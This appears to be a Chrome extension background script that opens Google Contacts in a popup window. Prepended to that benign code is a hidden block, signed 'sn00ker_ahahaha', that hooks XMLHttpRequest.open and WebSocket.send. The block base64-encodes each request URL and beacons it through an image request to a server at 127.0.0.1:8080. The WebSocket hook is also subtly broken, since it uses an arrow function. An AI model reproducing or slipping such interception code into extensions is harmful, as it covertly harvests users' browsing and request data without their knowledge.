function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var ctacwinID = 0;
if (localStorage.getItem("webW") === null) 
chrome.tabs.create({url: "options.html"});
chrome.browserAction.onClicked.addListener(function() {
if (ctacwinID == 0) {  
    var w =  parseInt(localStorage.getItem('webW'));
    var h =  parseInt(localStorage.getItem('webH'));
    var left = Math.round((screen.width/2)-(w/2));
    var top = Math.round((screen.height/2)-(h/2)); 
    chrome.windows.create({url: "https://contacts.google.com/", 'type': 'popup', focused: true, 'width': w, 'height': h, 'left': left, 'top': top}, function(window) {
	ctacwinID = window.id;
   });
} else {
	chrome.windows.update(ctacwinID, { focused: true });
	}
});

chrome.windows.onRemoved.addListener(function(windowID) {
	if (windowID == ctacwinID) {
		ctacwinID = 0;
	}
});

chrome.commands.onCommand.addListener(function(command) {
if (ctacwinID == 0) { 
    var w =  parseInt(localStorage.getItem('webW'));
    var h =  parseInt(localStorage.getItem('webH'));
    var left = Math.round((screen.width/2)-(w/2));
    var top = Math.round((screen.height/2)-(h/2));
  chrome.windows.create({url: "https://contacts.google.com/", 'type': 'popup', focused: true, 'width': w, 'height': h, 'left': left, 'top': top}, function(window) {
	ctacwinID = window.id;
   });
} else {
	chrome.windows.update(ctacwinID, { focused: true });
	}
});

chrome.windows.onRemoved.addListener(function(windowID) {
	if (windowID == ctacwinID) {
		ctacwinID = 0;
	}
});